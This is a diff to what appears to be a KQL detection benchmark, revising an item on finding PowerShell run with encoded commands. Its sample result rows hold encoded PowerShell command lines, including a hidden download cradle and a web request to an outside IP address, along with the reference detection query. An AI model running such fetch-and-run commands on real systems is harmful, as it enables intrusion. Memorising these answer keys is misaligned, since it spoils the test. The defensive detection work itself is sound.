@@ -390,7 +390,7 @@
     },
     {
       "id": "det-003-encoded-powershell",
-      "question": "Find any PowerShell that ran with an encoded command line.",
+      "question": "Which PowerShell processes ran with the -enc flag on the command line?",
       "category": "detection_logic",
       "tables": ["DeviceProcessEvents"],
       "reference_kql": "DeviceProcessEvents\n| where FileName =~ \"powershell.exe\"\n| where ProcessCommandLine contains \"-enc\"\n| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine\n| sort by TimeGenerated asc",
@@ -398,7 +398,7 @@
         {"TimeGenerated": "2026-09-07T01:18:22Z", "DeviceName": "web01.contoso.com", "AccountName": "jsmith", "InitiatingProcessFileName": "w3wp.exe", "ProcessCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA=="},
         {"TimeGenerated": "2026-09-09T06:48:10Z", "DeviceName": "hr-wks14.contoso.com", "AccountName": "mgarcia", "InitiatingProcessFileName": "explorer.exe", "ProcessCommandLine": "powershell.exe -nop -enc aQB3AHIAIAA0ADUALgAxADMAMwAuADEALgA4ADgALwBzADIA"}
       ],
-      "notes": "contains is a case-insensitive substring match, which is what is wanted here; has would tokenize and behave differently. The third powershell.exe row uses -ExecutionPolicy Bypass and is not encoded."
+      "notes": "The question names the -enc flag literally on purpose. PowerShell also accepts -EncodedCommand and any unambiguous shorter prefix, so a broader has_any detection across those spellings is arguably the better rule but would also match the -ExecutionPolicy Bypass row here and be scored wrong for being more thorough. Scoping the question to the literal flag keeps the item about string matching rather than about guessing how wide to cast. contains is a case-insensitive substring match, which is what is wanted here; has would tokenize and behave differently."
     },
     {
       "id": "det-004-multi-country-signins",
